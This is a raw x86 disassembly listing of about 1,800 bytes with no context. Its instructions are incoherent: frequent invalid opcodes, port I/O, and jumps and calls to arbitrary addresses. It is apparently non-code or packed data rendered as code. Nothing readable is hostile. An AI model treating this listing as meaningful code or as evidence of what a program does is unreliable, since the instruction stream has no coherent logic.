  41a41a:	inc    ebx
  41a41b:	iret   
  41a41c:	mov    dh,bl
  41a41e:	in     al,0x98
  41a420:	fnstsw WORD PTR [edx]
  41a422:	or     BYTE PTR fs:[edx],al
  41a425:	sbb    al,0xd2
  41a427:	call   0x1f3c6ff
  41a42c:	call   0x6ec93d00
  41a431:	ins    DWORD PTR es:[edi],dx
  41a432:	outs   dx,DWORD PTR ds:[esi]
  41a433:	test   BYTE PTR [edx-0x6b],bh
  41a436:	lods   eax,DWORD PTR ds:[esi]
  41a437:	jmp    0x41a431
  41a439:	jb     0x41a3d3
  41a43b:	scas   al,BYTE PTR es:[edi]
  41a43c:	or     eax,0x2c7b66c2
  41a441:	jp     0x41a483
  41a443:	mov    eax,0x4819a0d0
  41a448:	js     0x41a4b3
  41a44a:	sbb    al,0xc7
  41a44c:	xchg   ebp,eax
  41a44d:	jns    0x41a425
  41a44f:	mov    ds:0xc173f835,eax
  41a454:	xchg   bh,bl
  41a456:	retf   
  41a457:	sub    ecx,DWORD PTR ss:[ebp+0x38d3ecdb]
  41a45e:	fsubr  DWORD PTR [edx+0x23b7a0bd]
  41a464:	cmc    
  41a465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a466:	rol    ecx,0xb1
  41a469:	jbe    0x41a402
  41a46b:	xchg   ebp,eax
  41a46c:	dec    ebp
  41a46d:	sbb    DWORD PTR [ebx],ebp
  41a46f:	pop    edx
  41a470:	repz pop esp
  41a472:	lea    ebp,[eax]
  41a474:	push   0xffffff99
  41a476:	in     al,dx
  41a477:	je     0x41a420
  41a479:	in     eax,0xe7
  41a47b:	scas   al,BYTE PTR es:[edi]
  41a47c:	lds    ecx,FWORD PTR [esi-0x108231fa]
  41a482:	inc    eax
  41a483:	inc    esp
  41a484:	mov    ebp,0x740d504f
  41a489:	adc    al,0x8f
  41a48b:	mov    ds:0x84b4bd15,al
  41a490:	push   ecx
  41a491:	push   ecx
  41a492:	xor    eax,0x83f1eb1f
  41a497:	cld    
  41a498:	mov    bh,0x4e
  41a49a:	add    al,0x45
  41a49c:	fild   WORD PTR [ecx-0x5e]
  41a49f:	mov    dl,0x9d
  41a4a1:	cmp    BYTE PTR [esi-0x72b66860],ah
  41a4a7:	or     bl,BYTE PTR [ecx]
  41a4a9:	sar    BYTE PTR [edx+eiz*2-0x13],1
  41a4ad:	cmp    al,0xd8
  41a4af:	loope  0x41a496
  41a4b1:	sbb    al,0x8a
  41a4b3:	xchg   ebx,eax
  41a4b4:	xlat   BYTE PTR ds:[ebx]
  41a4b5:	add    ebp,ecx
  41a4b7:	add    edi,DWORD PTR [ebp-0x34]
  41a4ba:	mov    esp,0x90672af7
  41a4bf:	pop    ecx
  41a4c0:	push   eax
  41a4c1:	xchg   esp,eax
  41a4c2:	and    DWORD PTR [edx-0x7a64d065],ebp
  41a4c8:	mov    ebx,0x428109a8
  41a4cd:	mov    ebx,0xd0edaed0
  41a4d2:	xor    eax,0x2f581e81
  41a4d7:	jp     0x41a4e5
  41a4d9:	mov    edx,0x39fcc090
  41a4de:	xchg   ebx,eax
  41a4df:	mov    dl,0x16
  41a4e1:	rcr    BYTE PTR [edi+0x6bd3a0db],cl
  41a4e7:	inc    ebp
  41a4e8:	cmp    DWORD PTR [eax+esi*2+0x4a8535b9],ecx
  41a4ef:	xor    DWORD PTR ds:0x84d57674,0xffffffde
  41a4f6:	adc    eax,0xa544856f
  41a4fb:	std    
  41a4fc:	push   ebx
  41a4fd:	dec    edi
  41a4fe:	(bad)  
  41a4ff:	js     0x41a50d
  41a501:	stos   BYTE PTR es:[edi],al
  41a502:	jmp    0x41a528
  41a504:	mov    edx,0xaf94900a
  41a509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a50a:	and    BYTE PTR [eax+edi*8],0xf3
  41a50e:	js     0x41a56b
  41a510:	pop    esp
  41a511:	adc    al,0x5f
  41a513:	push   edx
  41a514:	jmp    0x41a4f9
  41a516:	outs   dx,DWORD PTR fs:[esi]
  41a518:	inc    ebx
  41a519:	mov    ebp,0x9d553a8a
  41a51e:	hlt    
  41a51f:	loop   0x41a4d6
  41a521:	fisttp WORD PTR [eax-0x644e0a7f]
  41a527:	cmp    eax,DWORD PTR [eax]
  41a529:	aad    0xe4
  41a52b:	jno    0x41a53f
  41a52d:	jecxz  0x41a559
  41a52f:	imul   edx,DWORD PTR [edx+ecx*1+0x4ba726b5],0xffffffea
  41a537:	icebp  
  41a538:	fcomp  QWORD PTR [edx]
  41a53a:	js     0x41a4ee
  41a53c:	adc    BYTE PTR ds:0xc24ad102,dl
  41a542:	fsub   st(6),st
  41a544:	ror    BYTE PTR [edx-0x48],1
  41a547:	lahf   
  41a548:	stos   BYTE PTR es:[edi],al
  41a549:	xor    ah,ah
  41a54b:	xchg   edi,eax
  41a54c:	jns    0x41a5cd
  41a54e:	sahf   
  41a54f:	sbb    al,0xb
  41a551:	xchg   DWORD PTR [eax],edx
  41a553:	ds js  0x41a516
  41a556:	ins    BYTE PTR es:[edi],dx
  41a557:	pop    eax
  41a558:	rcl    BYTE PTR [edx+0x60a8b196],cl
  41a55e:	xchg   edx,eax
  41a55f:	inc    edx
  41a560:	dec    edi
  41a561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a562:	cmp    eax,0x327bfe0
  41a567:	and    eax,0x27bd6252
  41a56c:	xchg   edx,eax
  41a56d:	rol    ecx,1
  41a56f:	fiadd  WORD PTR ds:0xa69ec372
  41a575:	popa   
  41a576:	outs   dx,BYTE PTR ds:[esi]
  41a577:	pop    esp
  41a578:	sahf   
  41a579:	hlt    
  41a57a:	lods   al,BYTE PTR ds:[esi]
  41a57b:	sbb    eax,ebp
  41a57d:	std    
  41a57e:	ins    BYTE PTR es:[edi],dx
  41a57f:	bound  edx,QWORD PTR [esi-0x6f6150cc]
  41a585:	daa    
  41a586:	jle    0x41a5c5
  41a588:	sub    BYTE PTR [edi],dh
  41a58a:	aam    0xf6
  41a58c:	enter  0x8e56,0xc5
  41a590:	aam    0xe0
  41a592:	cmp    bh,BYTE PTR [edx-0x13e6bf83]
  41a598:	out    dx,al
  41a599:	jl     0x41a614
  41a59b:	cmp    eax,0x3949762a
  41a5a0:	sub    edx,ebx
  41a5a2:	outs   dx,DWORD PTR ds:[esi]
  41a5a3:	xchg   ebp,eax
  41a5a4:	cmp    BYTE PTR [eax-0x5c],bh
  41a5a7:	jg     0x41a53f
  41a5a9:	pop    edx
  41a5aa:	ja     0x41a5f2
  41a5ac:	sub    bl,BYTE PTR [ecx-0x3f]
  41a5af:	ror    DWORD PTR [ecx+0x6e76556],0xfe
  41a5b6:	repz add bl,al
  41a5b9:	outs   dx,BYTE PTR ds:[esi]
  41a5ba:	mov    ds:0xe29f8071,al
  41a5bf:	loope  0x41a5a8
  41a5c1:	je     0x41a570
  41a5c3:	mov    ebx,0xe82add2a
  41a5c8:	cmc    
  41a5c9:	jns    0x41a557
  41a5cb:	dec    edx
  41a5cc:	int    0x6
  41a5ce:	test   ebp,0x334e68eb
  41a5d4:	mov    dh,0x5f
  41a5d6:	and    bh,bh
  41a5d8:	ret    0x7b69
  41a5db:	xor    ch,BYTE PTR [ecx-0x77e1e9a8]
  41a5e1:	adc    al,0x97
  41a5e3:	hlt    
  41a5e4:	je     0x41a58a
  41a5e6:	push   ecx
  41a5e7:	pop    ds
  41a5e8:	aaa    
  41a5e9:	shl    DWORD PTR [ebx+ebp*8-0x45],1
  41a5ed:	xchg   edi,eax
  41a5ee:	xchg   edi,eax
  41a5ef:	cdq    
  41a5f0:	jmp    FWORD PTR [edi]
  41a5f2:	hlt    
  41a5f3:	(bad)  
  41a5f4:	js     0x41a61e
  41a5f6:	pop    ss
  41a5f7:	fisttp WORD PTR [ecx-0x675ebe59]
  41a5fd:	inc    ebx
  41a5fe:	dec    ebp
  41a5ff:	in     eax,0x8e
  41a601:	push   edi
  41a602:	ss (bad) 
  41a605:	mov    edi,0x5e1f0ed5
  41a60a:	mov    esi,0x4da03210
  41a60f:	xchg   ecx,eax
  41a610:	xchg   edx,eax
  41a611:	xor    BYTE PTR ds:0x8bc7cd51,bl
  41a617:	int    0xd0
  41a619:	shr    DWORD PTR [ecx],cl
  41a61b:	sbb    eax,DWORD PTR [esi+0x33e15ce]
  41a621:	pop    ecx
  41a622:	jmp    DWORD PTR [edi+0xe4094de]
  41a628:	adc    ebp,DWORD PTR [edx+0x5f149297]
  41a62e:	mov    ebx,0x4f00487f
  41a633:	cli    
  41a634:	stos   DWORD PTR es:[edi],eax
  41a635:	in     al,0x7a
  41a637:	pop    es
  41a638:	xchg   esp,eax
  41a639:	ror    dh,1
  41a63b:	retf   
  41a63c:	adc    eax,0x38c36fbc
  41a641:	jmp    0xf34cffde
  41a646:	int3   
  41a647:	jmp    0x41a699
  41a649:	dec    esi
  41a64a:	pop    ds
  41a64b:	mov    ebx,0x4620c2d8
  41a650:	leave  
  41a651:	pop    edi
  41a652:	es jg  0x41a5d8
  41a655:	aaa    
  41a656:	test   eax,0x317842a8
  41a65b:	dec    edi
  41a65c:	inc    ebx
  41a65d:	xchg   edi,eax
  41a65e:	lahf   
  41a65f:	push   eax
  41a660:	pusha  
  41a661:	outs   dx,BYTE PTR ds:[esi]
  41a662:	inc    esp
  41a663:	dec    ebx
  41a664:	mov    bl,0x72
  41a666:	out    dx,al
  41a667:	rol    DWORD PTR [eax+0x5a2358c5],1
  41a66d:	mov    esi,DWORD PTR [eax+edx*1-0x18516c88]
  41a674:	jl     0x41a66f
  41a676:	out    dx,eax
  41a677:	repnz sbb ebx,DWORD PTR [eax+0x3caafc8b]
  41a67e:	and    BYTE PTR [esp-0x299cbf18],0xc5
  41a686:	mov    ah,dl
  41a688:	and    ebp,edi
  41a68a:	jp     0x41a698
  41a68c:	mov    edx,0x4026d8bf
  41a691:	cmp    ebx,ebp
  41a693:	icebp  
  41a694:	cmp    eax,0x70e23d5b
  41a699:	sbb    al,0xbf
  41a69b:	jbe    0x41a6e4
  41a69d:	pop    edx
  41a69e:	mov    cl,0x97
  41a6a0:	imul   esp,DWORD PTR [ecx+0x46e128dc],0x17
  41a6a7:	dec    edi
  41a6a8:	cs mov bl,0xe0
  41a6ab:	addr16 xchg ebp,eax
  41a6ad:	pop    ds
  41a6ae:	retf   
  41a6af:	shr    DWORD PTR [esi],0xe0
  41a6b2:	push   eax
  41a6b3:	adc    eax,0x129dde37
  41a6b8:	mov    ebx,esp
  41a6ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6bb:	xchg   esp,eax
  41a6bc:	rcl    BYTE PTR ds:0xa828d5fe,cl
  41a6c2:	fstp   DWORD PTR [eax+0x38]
  41a6c5:	mov    esi,ebp
  41a6c7:	pop    edi
  41a6c8:	sbb    al,0x4a
  41a6ca:	dec    ecx
  41a6cb:	ins    BYTE PTR es:[edi],dx
  41a6cc:	cmp    eax,0xe621ff6d
  41a6d1:	xchg   edx,eax
  41a6d2:	mov    bh,0x5f
  41a6d4:	mov    ds:0xecfe2c89,al
  41a6d9:	sub    eax,0xa2158fb1
  41a6de:	(bad)  
  41a6e0:	out    0x3a,eax
  41a6e2:	fidiv  WORD PTR [edx-0x5b8fc5ae]
  41a6e8:	xchg   edx,eax
  41a6e9:	cmp    dl,cl
  41a6eb:	sar    DWORD PTR [ecx+esi*1-0x68],1
  41a6ef:	add    BYTE PTR [ebx],ch
  41a6f1:	ret    
  41a6f2:	push   edi
  41a6f3:	(bad)  
  41a6f4:	cli    
  41a6f5:	jmp    0x41a693
  41a6f7:	stos   BYTE PTR es:[edi],al
  41a6f8:	fs or  eax,0xb90028d5
  41a6fe:	mov    WORD PTR [eax+edx*1-0x3b],es
  41a702:	pop    es
  41a703:	xchg   ecx,eax
  41a704:	(bad)  
  41a706:	stc    
  41a707:	sti    
  41a708:	leave  
  41a709:	jb     0x41a699
  41a70b:	shl    DWORD PTR [esi+0x33],1
  41a70e:	test   BYTE PTR [edx+0x44814dad],bh
  41a714:	mov    ds:0x6eaf0994,al
  41a719:	(bad)  
  41a71a:	sub    ebx,DWORD PTR [esi+0x1e]
  41a71d:	addr16 loop 0x41a6a6
  41a720:	ror    BYTE PTR [ebp+0x9],0xd8
  41a724:	and    DWORD PTR [eax],esp
  41a726:	shl    DWORD PTR [edi+0x50],cl
  41a729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a72a:	jbe    0x41a767
  41a72c:	push   edx
  41a72d:	mov    bl,0x6c
  41a72f:	lds    esi,FWORD PTR [esi-0x59]
  41a732:	cmc    
  41a733:	sti    
  41a734:	sbb    al,0x47
  41a737:	lock pop esp
  41a739:	(bad)  
  41a73a:	lds    edx,FWORD PTR [esi]
  41a73c:	mov    eax,ds:0x61f20b8e
  41a741:	mov    eax,ds:0x2f9460
  41a746:	dec    edx
  41a747:	jb     0x41a783
  41a749:	lock push ecx
  41a74b:	add    BYTE PTR [edx],0xef
  41a74e:	shl    BYTE PTR [eax],0x26
  41a751:	jp     0x41a6fd
  41a753:	das    
  41a754:	jp     0x41a780
  41a756:	pop    edi
  41a757:	xchg   ebp,eax
  41a758:	repnz add BYTE PTR [esi+0x6d],ch
  41a75c:	daa    
  41a75d:	(bad)  
  41a75e:	cld    
  41a75f:	daa    
  41a760:	inc    edi
  41a761:	sub    al,0x9e
  41a763:	icebp  
  41a764:	mov    cl,BYTE PTR [eax+0x4ce66ac5]
  41a76a:	push   0xf3c18115
  41a76f:	xchg   ebx,eax
  41a770:	cmp    BYTE PTR [ebx+0x54],al
  41a773:	cmp    bh,bl
  41a775:	xchg   esi,eax
  41a776:	(bad)  
  41a777:	ficom  WORD PTR [ebx]
  41a779:	ja     0x41a7ad
  41a77b:	push   ss
  41a77c:	or     DWORD PTR [edi-0x2d],eax
  41a77f:	and    esp,ecx
  41a781:	sbb    eax,ecx
  41a783:	retf   
  41a784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a785:	jp     0x41a786
  41a787:	ins    DWORD PTR es:[edi],dx
  41a788:	add    cl,BYTE PTR [ebp-0x41]
  41a78b:	enter  0xc5c5,0xc6
  41a78f:	popf   
  41a790:	xchg   BYTE PTR [ebx],dl
  41a792:	into   
  41a793:	lea    edi,[ebp+0x5bbb84ab]
  41a799:	fstp   TBYTE PTR [ecx-0x329de36f]
  41a79f:	pop    ecx
  41a7a0:	mov    gs,WORD PTR [edx-0x3]
  41a7a3:	xchg   ecx,eax
  41a7a4:	(bad)  
  41a7a5:	push   ebp
  41a7a6:	(bad)  
  41a7a7:	jmp    0x2820:0xbf2694b4
  41a7ae:	jne    0x41a731
  41a7b0:	sbb    al,0x32
  41a7b2:	xchg   esi,eax
  41a7b3:	cdq    
  41a7b4:	push   ss
  41a7b5:	mov    eax,es
  41a7b7:	call   0xe65b:0xfbf3ef00
  41a7be:	shl    esp,0x5f
  41a7c1:	fidiv  DWORD PTR [edx+ebx*8+0x3843b80a]
  41a7c8:	cld    
  41a7c9:	mov    dl,0x71
  41a7cb:	div    DWORD PTR [eax+0x18e2e343]
  41a7d1:	cmp    al,0x60
  41a7d3:	gs dec ebx
  41a7d5:	mov    dl,0x9a
  41a7d7:	jle    0x41a800
  41a7d9:	inc    esp
  41a7da:	or     al,0x20
  41a7dc:	jmp    0xaeb3:0x7cc91ab7
  41a7e3:	outs   dx,DWORD PTR ds:[esi]
  41a7e4:	rol    BYTE PTR [ebp-0x25],1
  41a7e7:	cs dec ebp
  41a7e9:	test   al,0x4
  41a7eb:	xor    ecx,ecx
  41a7ed:	bound  edx,QWORD PTR [eax-0x24b88aa2]
  41a7f3:	adc    BYTE PTR [edi-0x6248ee26],dl
  41a7f9:	out    dx,al
  41a7fa:	mov    eax,ds:0x71bc1570
  41a7ff:	pop    eax
  41a800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a801:	jbe    0x41a81d
  41a803:	shl    BYTE PTR [edi-0x40843f9c],1
  41a809:	int3   
  41a80a:	fisubr WORD PTR [ecx]
  41a80c:	arpl   WORD PTR ds:0x3231555a,cx
  41a812:	mov    al,0xbb
  41a814:	fiadd  DWORD PTR [edi+eiz*4]
  41a817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a818:	mov    DWORD PTR ds:0x401b2f1a,ebx
  41a81e:	sub    al,0x1b
  41a820:	jg     0x41a7f3
  41a822:	push   esi
  41a823:	cld    
  41a824:	dec    ebp
  41a825:	je     0x41a7f1
  41a827:	cmp    BYTE PTR [ecx+0x53],ah
  41a82a:	adc    ebx,ebx
  41a82c:	repz sbb ecx,edx
  41a82f:	jo     0x41a898
  41a831:	mov    ah,0x94
  41a833:	out    0x37,eax
  41a835:	jb     0x41a84d
  41a837:	inc    ecx
  41a838:	ret    0x744c
  41a83b:	data16 (bad) 
  41a83d:	mov    ebx,DWORD PTR [esi-0x40e35b3b]
  41a843:	push   eax
  41a845:	stc    
  41a846:	int3   
  41a847:	cmp    eax,0xd42f5b0d
  41a84c:	pop    esp
  41a84d:	pop    esi
  41a84e:	dec    ecx
  41a84f:	xchg   BYTE PTR [ebp+0x2c],ah
  41a852:	mov    ebx,0x1c915529
  41a857:	pop    es
  41a858:	adc    al,BYTE PTR ds:0xeaec1839
  41a85e:	je     0x41a81f
  41a860:	add    al,0xc7
  41a862:	jbe    0x41a878
  41a864:	pop    ebx
  41a865:	mov    ebx,DWORD PTR [ecx+0x53]
  41a868:	mov    ch,0x21
  41a86a:	pusha  
  41a86b:	icebp  
  41a86c:	xchg   esi,eax
  41a86d:	mov    ds,WORD PTR [eax+0x57ae99df]
  41a873:	push   ebx
  41a874:	ror    ebx,0x43
  41a877:	push   ss
  41a878:	push   eax
  41a879:	pushf  
  41a87a:	fs out dx,eax
  41a87c:	shl    edi,1
  41a87e:	adc    eax,esi
  41a880:	das    
  41a881:	dec    esp
  41a882:	pop    edi
  41a883:	push   ss
  41a884:	into   
  41a885:	adc    BYTE PTR [eax+0x8],bl
  41a888:	push   edi
  41a889:	mov    dl,0x6b
  41a88b:	mul    edi
  41a88d:	mov    ds:0x365f1441,al
  41a892:	scas   eax,DWORD PTR es:[edi]
  41a893:	pop    ss
  41a894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a895:	xor    DWORD PTR [ecx+edx*4],0xffffff96
  41a899:	adc    DWORD PTR [ebx-0x6b3f0eca],edx
  41a89f:	mov    WORD PTR ds:0x8c952ee7,es
  41a8a5:	(bad)  
  41a8a7:	inc    ebx
  41a8a8:	cmp    dl,BYTE PTR [eax-0x2f411230]
  41a8ae:	xchg   esi,eax
  41a8af:	(bad)  
  41a8b0:	out    0x71,eax
  41a8b2:	in     eax,0x91
  41a8b4:	xor    eax,0x10047fca
  41a8b9:	je     0x41a840
  41a8bb:	mov    cs,WORD PTR [edx+0x21]
  41a8be:	scas   al,BYTE PTR es:[edi]
  41a8bf:	hlt    
  41a8c0:	jbe    0x41a900
  41a8c2:	lods   eax,DWORD PTR ds:[esi]
  41a8c3:	daa    
  41a8c4:	sbb    BYTE PTR [edi],bl
  41a8c6:	lahf   
  41a8c7:	popf   
  41a8c8:	adc    DWORD PTR [ebx+0x41a47d36],ecx
  41a8ce:	inc    esi
  41a8cf:	idiv   cl
  41a8d1:	mov    WORD PTR [ebp+0x74],cs
  41a8d4:	jge    0x41a8ba
  41a8d6:	mov    dl,0xbb
  41a8d8:	(bad)  
  41a8da:	adc    BYTE PTR [ebx-0x3c],ch
  41a8dd:	inc    esi
  41a8de:	mov    ebp,0xdf0a945a
  41a8e3:	jns    0x41a886
  41a8e5:	pusha  
  41a8e6:	cmp    BYTE PTR [edi+0x7f04b1ec],ah
  41a8ec:	push   edx
  41a8ed:	call   DWORD PTR [edi-0x1]
  41a8f0:	pop    ebx
  41a8f1:	pushf  
  41a8f2:	fwait
  41a8f3:	push   esi
  41a8f4:	mov    esi,0xc4d379b9
  41a8f9:	repz xchg ebp,eax
  41a8fb:	cwde   
  41a8fc:	mov    es,WORD PTR [esi]
  41a8fe:	test   al,0x2b
  41a900:	cmp    ecx,DWORD PTR [edi-0x20c3339b]
  41a906:	jnp    0x41a8fd
  41a908:	mov    edi,0xcc39abc
  41a90d:	push   es
  41a90e:	mov    cl,0x1f
  41a910:	sahf   
  41a911:	add    ch,BYTE PTR [esi]
  41a913:	(bad)  
  41a914:	and    DWORD PTR [esi],ebp
  41a916:	mov    fs,WORD PTR [eax]
  41a918:	pop    edx
  41a919:	xchg   edx,edx
  41a91b:	js     0x41a983
  41a91d:	jmp    0x41a8f2
  41a91f:	daa    
  41a920:	adc    cl,al
  41a922:	inc    eax
  41a923:	jns    0x41a97c
  41a925:	cmp    al,0xf4
  41a927:	call   0x54c23504
  41a92c:	add    cl,bl
  41a92e:	loop   0x41a8cc
  41a930:	call   0x707db1e0
  41a935:	into   
  41a936:	nop
  41a937:	sti    
  41a938:	fs mov dh,0x38
  41a93b:	fisttp DWORD PTR [ecx-0x71]
  41a93e:	sub    dl,BYTE PTR [edx]
  41a940:	push   ds
  41a941:	lods   eax,DWORD PTR ds:[esi]
  41a942:	or     BYTE PTR [eax-0x23],ah
  41a945:	js     0x41a996
  41a947:	mov    WORD PTR [ecx-0x6b],ss
  41a94a:	add    al,ah
  41a94c:	stc    
  41a94d:	add    DWORD PTR [edi+0x52],0x676e4ce4
  41a954:	push   DWORD PTR [eax-0x78b6801b]
  41a95a:	sbb    edx,DWORD PTR [eax-0x3e0a8f09]
  41a960:	push   0xf48c527e
  41a965:	xchg   ebp,eax
  41a966:	das    
  41a967:	call   0xc690:0x769ca7c9
  41a96e:	clc    
  41a96f:	les    edx,FWORD PTR [esi-0x508390a5]
  41a975:	dec    esi
  41a976:	retf   
  41a977:	data16 int3 
  41a979:	xor    edx,DWORD PTR [eax+0x24]
  41a97c:	push   ss
  41a97d:	std    
  41a97e:	push   cs
  41a97f:	fisubr DWORD PTR [edx-0x1b]
  41a982:	and    bh,bh
  41a984:	xchg   edx,eax
  41a985:	pusha  
  41a986:	lea    eax,[ecx]
  41a988:	lahf   
  41a989:	mov    dh,0x74
  41a98b:	pop    es
  41a98c:	jnp    0x41a948
  41a98e:	sbb    al,0xca
  41a990:	lods   eax,DWORD PTR ds:[esi]
  41a991:	daa    
  41a992:	push   eax
  41a993:	loopne 0x41a9a7
  41a995:	retf   0x2a60
  41a998:	mov    ebx,0xab61a3d3
  41a99d:	push   0x7a91c67f
  41a9a2:	dec    edi
  41a9a3:	sub    al,bl
  41a9a5:	mov    BYTE PTR [eax],ch
  41a9a7:	nop
  41a9a8:	js     0x41aa08
  41a9aa:	jmp    0x41aa1b
  41a9ac:	ret    0x15c5
  41a9af:	cmp    ebx,ebp
  41a9b1:	or     eax,0x17441a67
  41a9b6:	adc    DWORD PTR ds:0x8958a9af,ebp
  41a9bc:	shl    DWORD PTR [eax],cl
  41a9be:	jmp    0x7d6096f2
  41a9c3:	mov    BYTE PTR ds:0x28cc525f,bl
  41a9c9:	icebp  
  41a9ca:	mov    WORD PTR [esi-0x1c],cs
  41a9cd:	fwait
  41a9ce:	cmp    BYTE PTR [edx-0x2c],bl
  41a9d1:	daa    
  41a9d2:	xor    al,0x10
  41a9d4:	mov    esi,0xf1fd329b
  41a9d9:	enter  0x241d,0x83
  41a9dd:	mov    dh,BYTE PTR fs:[ecx]
  41a9e0:	ret    0xfa9f
  41a9e3:	adc    DWORD PTR [edi-0x7],eax
  41a9e6:	push   edx
  41a9e7:	add    ebx,esp
  41a9e9:	xchg   DWORD PTR [edx],edi
  41a9eb:	addr16 push esp
  41a9ed:	cli    
  41a9ee:	xor    edi,ebp
  41a9f0:	push   edi
  41a9f1:	push   edx
  41a9f2:	hlt    
  41a9f3:	cmc    
  41a9f4:	push   0xc83d781f
  41a9f9:	jp     0x41a996
  41a9fb:	ja     0x41a9cd
  41a9fd:	mov    bl,0xa0
  41a9ff:	in     al,0x18
  41aa01:	and    eax,0xe27b91ae
  41aa06:	add    bl,BYTE PTR [ebp-0x4e35be3e]
  41aa0c:	std    
  41aa0d:	cli    
  41aa0e:	mov    cl,0x9b
  41aa10:	cmp    eax,DWORD PTR [esi+0x25]
  41aa13:	jl     0x41aa19
  41aa15:	inc    edx
  41aa16:	dec    esi
  41aa17:	xor    al,0x2b
  41aa1a:	or     DWORD PTR [edi+0x74],ecx
  41aa1d:	lahf   
  41aa1e:	test   DWORD PTR [ecx+0x3c],esp
  41aa21:	adc    DWORD PTR [ebx],eax
  41aa23:	pop    ss
  41aa24:	imul   edi,DWORD PTR [ebx+0x22129107],0xffffff83
  41aa2b:	dec    BYTE PTR [edi-0x25]
  41aa2e:	cmp    DWORD PTR [edi-0x73b00ea],ebp
  41aa34:	adc    cl,al
  41aa36:	outs   dx,DWORD PTR ds:[esi]
  41aa37:	out    0xd7,al
  41aa39:	dec    edi
  41aa3a:	inc    ecx
  41aa3b:	out    dx,al
  41aa3c:	push   ss
  41aa3d:	ins    BYTE PTR es:[edi],dx
  41aa3e:	lock cmp BYTE PTR [edx-0x12],cl
  41aa42:	mov    DWORD PTR [ebx+0x4f],edi
  41aa45:	add    ebp,DWORD PTR [ebp-0x6d]
  41aa48:	mov    ah,0xc6
  41aa4a:	int    0x82
  41aa4c:	mov    dl,0x86
  41aa4e:	mov    al,ds:0xa5bf7e65
  41aa53:	jae    0x41aaa4
  41aa55:	and    al,BYTE PTR ss:[eax]
  41aa58:	sahf   
  41aa59:	jmp    0x41aa52
  41aa5b:	push   ecx
  41aa5c:	mov    edi,0x4ecbeb81
  41aa61:	retf   0x6716
  41aa64:	dec    esp
  41aa65:	shr    DWORD PTR [ebx],1
  41aa67:	adc    bh,BYTE PTR [esi]
  41aa69:	xchg   esi,eax
  41aa6a:	mov    ds,WORD PTR [edi]
  41aa6c:	sub    DWORD PTR [ecx+0x5a],eax
  41aa6f:	mov    ch,0x92
  41aa71:	sbb    eax,0x84870dee
  41aa76:	xlat   BYTE PTR ds:[ebx]
  41aa77:	retf   
  41aa78:	lods   eax,DWORD PTR ds:[esi]
  41aa79:	int3   
  41aa7a:	sub    al,0xa6
  41aa7c:	test   BYTE PTR [eax],dh
  41aa7e:	aad    0x34
  41aa80:	stc    
  41aa81:	rol    esp,cl
  41aa83:	sbb    DWORD PTR es:[edx+0x3e],ecx
  41aa87:	adc    BYTE PTR [ecx+ecx*2-0x6b],bl
  41aa8b:	retf   
  41aa8c:	jmp    0x156e205d
  41aa91:	nop
  41aa92:	adc    bl,0xab
  41aa95:	pop    ebx
  41aa96:	mov    dl,0xf4
  41aa98:	adc    DWORD PTR [ebx],esi
  41aa9a:	dec    eax
  41aa9b:	sbb    al,BYTE PTR [eax-0xb]
  41aa9e:	push   edi
  41aa9f:	mov    edx,0x6b18e0c7
  41aaa4:	aad    0x41
  41aaa6:	sar    DWORD PTR [ecx],0x67
  41aaa9:	test   eax,0x3b266d29
  41aaae:	xchg   edi,eax
  41aaaf:	inc    ebx
  41aab0:	dec    DWORD PTR [edi+0x1b]
  41aab3:	test   eax,0xaeb7a0f
  41aab8:	sar    BYTE PTR [ebx-0x46b928bb],cl
  41aabe:	cmp    eax,0x8ad31d69
  41aac3:	sbb    BYTE PTR [edi-0x2d],0x70
  41aac7:	jbe    0x41ab04
  41aac9:	(bad)  
  41aaca:	(bad)  
  41aacb:	xlat   BYTE PTR ds:[ebx]
  41aacc:	popa   
  41aacd:	inc    ebp
  41aace:	pop    ebx
  41aacf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aad0:	into   
  41aad1:	ins    BYTE PTR es:[edi],dx
  41aad2:	xlat   BYTE PTR ds:[ebx]
  41aad3:	push   ecx
  41aad4:	xor    ch,ah
  41aad6:	push   ebx
  41aad7:	jmp    0xdfe42955
  41aadc:	mov    es,WORD PTR [esi]
  41aade:	mov    edi,0xfb3b5e0a
  41aae3:	repnz cld 
  41aae5:	lods   al,BYTE PTR ds:[esi]
  41aae6:	pop    esi
  41aae7:	sar    dh,1
  41aae9:	out    0xc5,eax
  41aaeb:	nop
  41aaec:	pushf  
  41aaed:	xor    eax,0x2181b580
  41aaf2:	adc    esp,DWORD PTR [ebx-0xc08d41d]
  41aaf8:	bound  ecx,QWORD PTR [edi]
  41aafa:	sbb    ah,BYTE PTR [edx]
  41aafc:	jb     0x41aa7e
  41aafe:	xor    eax,0x9a007a0c
  41ab03:	in     al,0xda
  41ab05:	gs mov dl,0x97
  41ab08:	es inc esi
  41ab0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab0b:	loope  0x41aaca
  41ab0d:	cmp    al,0x96
  41ab0f:	in     al,dx
  41ab10:	mov    al,0x50
  41ab12:	out    0x61,eax
  41ab14:	(bad)  
  41ab15:	cmc    
  41ab16:	xchg   edx,eax
  41ab17:	(bad)  
  41ab18:	stos   BYTE PTR es:[edi],al
  41ab19:	sbb    esp,0x5dce23d5
  41ab1f:	and    bl,BYTE PTR [ebp+0x7d10b96f]
  41ab25:	cmp    al,0xfc
  41ab27:	push   ebx
  41ab28:	call   0x6eaa69dd
  41ab2d:	lods   eax,DWORD PTR ds:[esi]
  41ab2e:	gs inc ecx
  41ab30:	adc    al,0xd1
  41ab32:	sbb    eax,0x2139efb1
  41ab37:	mov    bl,0xbe
  41ab39:	in     al,0x84
  41ab3b:	enter  0xfa92,0xe2
  41ab3f:	fild   WORD PTR [edi+0x58b7922c]
  41ab45:	lahf   
  41ab46:	mov    esi,0xbc26de8c
  41ab4b:	mov    ds:0x8741277f,eax
  41ab50:	mov    edi,0xad842968
  41ab55:	mov    ebx,0x8f8c181
  41ab5a:	push   edi
  41ab5b:	add    BYTE PTR [edi],cl
  41ab5d:	scas   eax,DWORD PTR es:[edi]
  41ab5e:	retf   0x4d89
